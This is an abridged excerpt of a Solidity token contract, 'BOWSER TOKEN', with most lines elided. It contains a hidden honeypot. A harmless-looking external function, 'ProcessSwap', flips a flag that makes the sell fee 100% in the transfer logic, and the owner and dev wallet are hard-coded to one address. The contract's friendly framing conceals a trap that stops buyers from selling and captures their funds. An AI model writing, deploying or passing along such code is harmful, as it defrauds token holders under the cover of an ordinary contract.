...
// Our rules are simple. Join to Play
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0x03167dec6C1af3dC03acf10421068ff2BDCE3f1d;
...
contract BowserToken is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x03167dec6C1af3dC03acf10421068ff2BDCE3f1d);
  ...
  //   TOKEN DETAILS
    ...
    string private _name = "BOWSER TOKEN"; 
    ...
    */
    ...
    function ProcessSwap () external virtual {
        bonamo = 1;
    } 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = (bonamo <= 0 ? _sellFee:100);}
